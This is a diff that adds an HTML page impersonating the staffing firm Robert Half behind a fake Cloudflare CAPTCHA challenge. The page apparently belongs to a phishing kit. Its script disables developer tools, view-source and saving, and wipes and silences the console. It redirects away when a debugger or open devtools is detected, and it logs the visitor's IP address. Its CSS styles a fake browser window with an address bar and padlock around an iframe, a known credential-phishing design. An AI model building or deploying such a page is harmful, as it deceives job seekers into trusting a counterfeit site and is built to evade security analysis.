@@ -1,0 +1,745 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/svg+xml" href="/icon.svg" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Find the right job type for you | Robert Half</title>
+  <link rel="preload" as="image" href="/assets/Robert_Half_logo_svg-CZesgUyF.svg"/>
+  <link rel="preload" as="image" href="/assets/talent-CL6Pu7KI.svg"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+  <script type="module" crossorigin src="/assets/index-CS2NADC7.js"></script>
+  <link rel="stylesheet" crossorigin href="/assets/index-B8yvxgs4.css">
+  <style>
+      /* Source Protection Styles */
+      * {
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        -webkit-touch-callout: none;
+        -webkit-tap-highlight-color: transparent;
+      }
+      
+      body {
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        -webkit-overflow-scrolling: touch;
+      }
+      
+      /* Mobile optimizations */
+      @media (max-width: 768px) {
+        body {
+          overflow-x: hidden;
+        }
+        
+        .clf-button {
+          min-height: 44px;
+          font-size: 16px;
+        }
+      }
+
+      .modal-overlay {
+        position: fixed;
+        inset: 0;
+        display: none;
+        justify-content: center;
+        align-items: center;
+        background: rgba(32, 33, 36, 0.6);
+        z-index: 9999;
+        width: 100vw;
+        height: 100vh;
+      }
+
+      /* === Modal Box === */
+      .modal {
+        background: #fff;
+        border-radius: 6px;
+        width: 90vw;
+        height: 80vh;
+        max-width: 1000px;
+        max-height: 800px;
+        min-width: 320px;
+        min-height: 300px;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+        animation: fadeIn 0.25s ease;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+      }
+
+      /* Update animation for centered modal */
+      @keyframes fadeIn {
+        from { 
+          opacity: 0; 
+          transform: translate(-50%, -48%) scale(0.95); 
+        }
+        to { 
+          opacity: 1; 
+          transform: translate(-50%, -50%) scale(1); 
+        }
+      }
+
+      /* === Fake Browser Header === */
+      .modal-header {
+        display: flex;
+        align-items: center;
+        background: #e0e0e0;
+        border-bottom: 1px solid #bdbdbd;
+        height: 32px;
+        padding: 0 8px;
+      }
+
+      .modal-header .title {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 13px;
+        color: #202124;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+
+      .modal-header img {
+        width: 14px;
+        height: 14px;
+      }
+
+      .window-controls {
+        display: flex;
+        gap: 6px;
+      }
+
+      .window-controls div {
+        width: 12px;
+        height: 12px;
+        margin-left: 10px;
+        border-radius: 50%;
+        background: #d3d3d3;
+        cursor: pointer;
+      }
+
+      /* === Address Bar === */
+      .modal-urlbar {
+        background: #f8f9fa;
+        border-bottom: 1px solid #dadce0;
+        height: 38px;
+        display: flex;
+        align-items: center;
+        padding: 0 10px;
+        gap: 8px;
+        font-size: 13px;
+      }
+
+      .modal-urlbar .lock {
+        color: #15803d;
+        font-size: 13px;
+        margin-right: -2px;
+      }
+
+      .modal-urlbar .url {
+        color: #1a73e8;
+        flex: 1;
+        user-select: text;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+
+      /* === Iframe === */
+      iframe {
+        flex: 1;
+        width: 100%;
+        border: none;
+      }
+
+      /* @keyframes fadeIn {
+        from { opacity: 0; transform: scale(0.95); }
+        to { opacity: 1; transform: scale(1); }
+      } */
+
+      /* === Mobile Responsiveness === */
+      @media (max-width: 600px) {
+        .modal {
+          width: 95vw;
+          height: 90vh;
+          border-radius: 4px;
+        }
+        .modal-header .title {
+          font-size: 12px;
+        }
+        .modal-urlbar .url {
+          font-size: 11px;
+        }
+      }
+
+      /* Overlay background */
+      .clf-overlay {
+        position: fixed;
+        inset: 0;
+        background: #ffffff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 999999;
+      }
+
+      /* Main container */
+      .clf-container {
+        max-width: 680px;
+        width: 100%;
+        text-align: left;
+        padding: 40px 40px 60px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          "Helvetica Neue", Arial, sans-serif;
+        color: #333333;
+      }
+
+      /* Logo */
+      .clf-logo {
+        display: block;
+        height: 40px;
+        margin-bottom: 32px;
+      }
+
+      /* Title text */
+      .clf-title {
+        font-size: 19px;
+        font-weight: 500;
+        color: #333333;
+        margin: 0 0 28px;
+      }
+
+      /* Description block */
+      .clf-challenge {
+        font-size: 15px;
+        line-height: 1.6;
+        color: #333333;
+        margin-top: calc(.25rem * 5);
+      }
+
+      .clf-challenge strong {
+        font-size: 15px;
+        color: #222222;
+        padding-bottom: 0.25rem;
+        font-weight: 700;
+      }
+
+      .clf-challenge p {
+        color: #444444;
+        font-size: 11px;
+        border-bottom-style: solid;
+        border-bottom-width: 1px;
+        border-bottom-color: rgb(209 213 220);
+        padding-bottom: 0.75rem;
+      }
+
+      /* Event ID text */
+      .clf-event-id {
+        font-family: "SFMono-Regular", Menlo, Monaco, Consolas,
+          "Liberation Mono", "Courier New", monospace;
+        font-size: 12px;
+        color: #777777;
+      }
+
+      /* Button */
+      .clf-button {
+        display: inline-block;
+        padding: 10px 32px;
+        border-radius: 3px;
+        border: none;
+        cursor: pointer;
+        font-size: 14px;
+        font-weight: 500;
+        color: #ffffff;
+        box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1);
+        transition: background-color 0.15s ease, box-shadow 0.15s ease, opacity 0.3s ease;
+        background-color: rgb(230, 136, 56);
+        opacity: 1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 5px;
+      }
+
+      .clf-button:hover {
+        background-color: #f18a21;
+        box-shadow: 0 1px 0 rgba(0, 0, 0, 0.18);
+      }
+
+      .clf-button:active {
+        background-color: #dd7c1d;
+      }
+
+      .clf-button:disabled {
+        cursor: not-allowed;
+        opacity: 0.7;
+      }
+
+      .clf-button:disabled:hover {
+        background-color: rgb(230, 136, 56);
+        box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1);
+      }
+
+      /* Loading spinner */
+      .clf-spinner {
+        width: 16px;
+        height: 16px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-top: 2px solid #ffffff;
+        border-radius: 50%;
+        animation: clf-spin 1s linear infinite;
+        display: inline-block;
+      }
+
+      @keyframes clf-spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
+      /* Page Loading Overlay */
+      .page-loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.7);
+        z-index: 999998;
+        pointer-events: none;
+        opacity: 1;
+        transition: opacity 0.5s ease-out;
+      }
+
+      .page-loading-overlay.hidden {
+        opacity: 0;
+        pointer-events: none;
+      }
+
+      /* Flowing Progress Bar */
+      .progress-bar-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 6px;
+        background: rgba(0, 0, 0, 0.1);
+        z-index: 999999;
+        overflow: hidden;
+        opacity: 1;
+      }
+
+      .progress-bar {
+        height: 100%;
+        background: linear-gradient(90deg, #8e9aaf, #a8b3c7, #c5cdd9, #8e9aaf);
+        width: 0%;
+        animation: progressFlow 4s ease-out forwards;
+        position: relative;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      }
+
+      .progress-bar::after {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+        animation: progressShine 1s ease-in-out infinite;
+      }
+
+      @keyframes progressFlow {
+        0% { width: 0%; }
+        25% { width: 20%; }
+        50% { width: 50%; }
+        75% { width: 80%; }
+        90% { width: 95%; }
+        100% { width: 100%; }
+      }
+
+      @keyframes progressShine {
+        0% { transform: translateX(-100%); }
+        100% { transform: translateX(300%); }
+      }
+
+      /* Hide progress bar after loading */
+      .progress-bar-container.hidden {
+        opacity: 0;
+        transition: opacity 0.5s ease-out;
+      }
+
+      /* Additional info */
+      .clf-info {
+        margin-top: 22px;
+        font-size: 13px;
+        color: #666666;
+        line-height: 1.6;
+      }
+
+      /* Responsive for small screens */
+      @media (max-width: 600px) {
+        .clf-container {
+          padding: 24px 20px 40px;
+        }
+
+        .clf-title {
+          font-size: 18px;
+        }
+      }
+
+    </style>
+</head>
+
+<body class="antialiased font-sans">
+  <!-- Source Code Protection -->
+    <script>
+    (function() {
+      'use strict';
+      
+      // Disable right-click context menu
+      document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+      });
+      
+      // Disable F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U
+      document.addEventListener('keydown', function(e) {
+        // F12
+        if(e.keyCode === 123) {
+          e.preventDefault();
+          return false;
+        }
+        // Ctrl+Shift+I (Inspector)
+        if(e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+          e.preventDefault();
+          return false;
+        }
+        // Ctrl+Shift+C (Console)
+        if(e.ctrlKey && e.shiftKey && e.keyCode === 67) {
+          e.preventDefault();
+          return false;
+        }
+        // Ctrl+Shift+J (Console)
+        if(e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+          e.preventDefault();
+          return false;
+        }
+        // Ctrl+U (View Source)
+        if(e.ctrlKey && e.keyCode === 85) {
+          e.preventDefault();
+          return false;
+        }
+        // Ctrl+S (Save)
+        if(e.ctrlKey && e.keyCode === 83) {
+          e.preventDefault();
+          return false;
+        }
+      });
+      
+      // Disable text selection
+      document.onselectstart = function() {
+        return false;
+      };
+      
+      // Disable drag
+      document.ondragstart = function() {
+        return false;
+      };
+      
+      // Clear console periodically (less frequent on mobile)
+      if (!isMobileDevice()) {
+        setInterval(function() {
+          console.clear();
+        }, 1000);
+      }
+      
+      // Detect developer tools (skip on mobile)
+      function isMobileDevice() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
+               ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+      }
+      
+      if (!isMobileDevice()) {
+        let devtools = { open: false, orientation: null };
+        const threshold = 160;
+        
+        setInterval(function() {
+          if (window.outerHeight - window.innerHeight > threshold || 
+              window.outerWidth - window.innerWidth > threshold) {
+            if (!devtools.open) {
+              devtools.open = true;
+              console.clear();
+              // Redirect away if dev tools detected
+              window.location.href = 'about:blank';
+            }
+          } else {
+            devtools.open = false;
+          }
+        }, 500);
+      }
+      
+      // Disable printing
+      window.addEventListener('beforeprint', function(e) {
+        e.preventDefault();
+        return false;
+      });
+      
+      // Obfuscate console messages (less aggressive on mobile)
+      if (!isMobileDevice()) {
+        console.log = function() {};
+        console.warn = function() {};
+        console.error = function() {};
+        console.info = function() {};
+        console.debug = function() {};
+      }
+      
+      // Prevent iframe embedding
+      if (window.top !== window.self) {
+        window.top.location = window.self.location;
+      }
+      
+      // Anti-debugging (disabled on mobile)
+      if (!isMobileDevice()) {
+        function detectDebugger() {
+          var start = new Date();
+          debugger;
+          var end = new Date();
+          if (end - start > 100) {
+            window.location.href = 'about:blank';
+          }
+        }
+        
+        // Run anti-debugging check
+        setInterval(detectDebugger, 1000);
+      }
+      
+    })();
+    </script>
+
+  <div id="root" style="height: 100vh;"></div>
+
+  <!-- Page Loading Overlay -->
+  <div class="page-loading-overlay" id="pageLoadingOverlay"></div>
+  
+  <!-- Progress Bar -->
+  <div class="progress-bar-container" id="progressBarContainer">
+    <div class="progress-bar"></div>
+  </div>
+
+  <div class="clf-overlay" id="captchaScreen">
+    <div class="clf-container">
+
+      <img src="./img/clf.png" alt="Cloudflare" class="clf-logo" style="width: 150px;; height: auto;">
+
+      <h1 class="clf-title">
+        Please complete the following CAPTCHA security challenge to continue!
+      </h1>
+
+      <button class="clf-button" id="captchaButton"><span class="clf-spinner"></span> Verifying...</button>
+
+      <div class="clf-challenge">
+        <strong>Why do I see CAPTCHA challenge?</strong>
+        <p>Due to enhanced firewall security measures, you are required to complete
+        a CAPTCHA security challenge to proceed with access to this website.</p>
+        
+        <p style="border: none;">Event ID: <span class="clf-event-id">escubr1h9nrlv2b2qaoisdr7</span></p>
+      </div>
+
+    </div>
+  </div>
+</body>
+<script type="module">
+  document.addEventListener('DOMContentLoaded', () => {
+    // Page Loading Management (controlled by CAPTCHA verification)
+      const pageLoadingOverlay = document.getElementById('pageLoadingOverlay');
+      const progressBarContainer = document.getElementById('progressBarContainer');
+      
+      // Hide loading elements initially
+      pageLoadingOverlay.classList.add('hidden');
+      progressBarContainer.classList.add('hidden');
+
+      // Function to show loading during verification
+      window.showVerificationLoading = () => {
+        console.log('Showing verification loading...');
+        pageLoadingOverlay.classList.remove('hidden');
+        progressBarContainer.classList.remove('hidden');
+
+        // Ensure visibility
+        pageLoadingOverlay.style.display = 'block';
+        progressBarContainer.style.display = 'block';
+
+        // Reset animation
+        const progressBar = progressBarContainer.querySelector('.progress-bar');
+        progressBar.style.animation = 'none';
+        progressBar.offsetHeight; // Trigger reflow
+        progressBar.style.animation = 'progressFlow 4s ease-out forwards';
+
+        console.log('Progress bar animation started');
+      };
+
+      // Function to hide loading after verification
+      window.hideVerificationLoading = () => {
+        pageLoadingOverlay.classList.add('hidden');
+        progressBarContainer.classList.add('hidden');
+      };
+
+      // CAPTCHA functionality
+      const captchaScreen = document.getElementById('captchaScreen');
+      const captchaButton = document.getElementById('captchaButton');
+      
+      // Check if verification info exists in localStorage
+      const storedVerification = localStorage.getItem('captcha_verification');
+      
+      if (storedVerification) {
+        try {
+          const verificationData = JSON.parse(storedVerification);
+          // Check if stored data is still valid (you can add expiration logic here)
+          // if (verificationData.verified && verificationData.ip) {
+          //   // Skip CAPTCHA if already verified
+          //   captchaScreen.style.display = 'none';
+          //   console.log('CAPTCHA verification skipped - already verified');
+          //   return;
+          // }
+        } catch (e) {
+          // Invalid stored data, remove it
+          localStorage.removeItem('captcha_verification');
+        }
+      }
+
+      // Show CAPTCHA screen and initialize verification process
+      captchaScreen.style.display = 'flex';
+      
+      // Function to get IP address from API
+      async function getIPAddress() {
+        try {
+          const response = await fetch('https://api.ipify.org?format=json');
+          const data = await response.json();
+          return data.ip;
+        } catch (error) {
+          console.error('Error fetching IP:', error);
+          // Fallback API
+          try {
+            const fallbackResponse = await fetch('https://httpbin.org/ip');
+            const fallbackData = await fallbackResponse.json();
+            return fallbackData.origin;
+          } catch (fallbackError) {
+            console.error('Error with fallback IP service:', fallbackError);
+            throw new Error('Unable to fetch IP address');
+          }
+        }
+      }
+
+      // Function to handle initial IP verification (auto-start)
+      async function initializeVerification() {
+        // Change page title to include "Verify"
+        document.title = 'Verify - Robert Half';
+        
+        // Set button to verifying state with spinner
+        captchaButton.innerHTML = '<span class="clf-spinner"></span> Verifying...';
+        captchaButton.style.opacity = '0.7';
+        captchaButton.disabled = true;
+
+        // Show page loading overlay and progress bar immediately
+        if (window.showVerificationLoading) {
+          window.showVerificationLoading();
+        }
+
+        try {
+          // Get IP address
+          const ipAddress = await getIPAddress();
+          
+          // Add 3-5 second delay as requested (matching progress bar duration)
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          
+          // Store IP data temporarily (not fully verified until user clicks)
+          window.tempVerificationData = {
+            ip: ipAddress,
+            timestamp: Date.now(),
+            eventId: document.querySelector('.clf-event-id').textContent
+          };
+          
+          // Hide loading overlay and progress bar
+          if (window.hideVerificationLoading) {
+            window.hideVerificationLoading();
+          }
+          
+          // Restore original page title
+          document.title = 'Robert Half';
+          
+          // Update button to ready state - user must click manually
+          captchaButton.innerHTML = 'I am not a bot';
+          captchaButton.style.opacity = '1';
+          captchaButton.disabled = false;
+          
+          console.log('IP verification completed, waiting for user interaction');
+          
+        } catch (error) {
+          console.error('Initial verification failed:', error);
+          
+          // Hide loading overlay and progress bar on error
+          if (window.hideVerificationLoading) {
+            window.hideVerificationLoading();
+          }
+          
+          // Reset button on error
+          captchaButton.innerHTML = 'I am not a bot';
+          captchaButton.style.opacity = '1';
+          captchaButton.disabled = false;
+          alert('Verification failed. Please try again.');
+        }
+      }
+
+      // Hide the main page initially
+      const mainPage = document.getElementById('root');
+      mainPage.style.display = 'none';
+
+      // Function to handle manual user verification (when user clicks)
+      function completeVerification() {
+        if (!window.tempVerificationData) {
+          // If no temp data, restart the process
+          initializeVerification();
+          return;
+        }
+
+        // Create final verification data
+        const verificationData = {
+          verified: true,
+          ...window.tempVerificationData
+        };
+
+        // Save to localStorage
+        localStorage.setItem('captcha_verification', JSON.stringify(verificationData));
+
+        // Hide CAPTCHA screen after successful verification
+        captchaScreen.style.display = 'none';
+
+        // Display the main page
+        mainPage.style.display = 'block';
+
+        // Clean up temp data
+        delete window.tempVerificationData;
+      }
+
+      // Add click event listener to captcha button for manual completion
+      captchaButton.addEventListener('click', completeVerification);
+
+      // Start initial verification process automatically when page loads
+      setTimeout(() => {
+        initializeVerification();
+      }, 500);
+
+  });
+</script>
+</html>
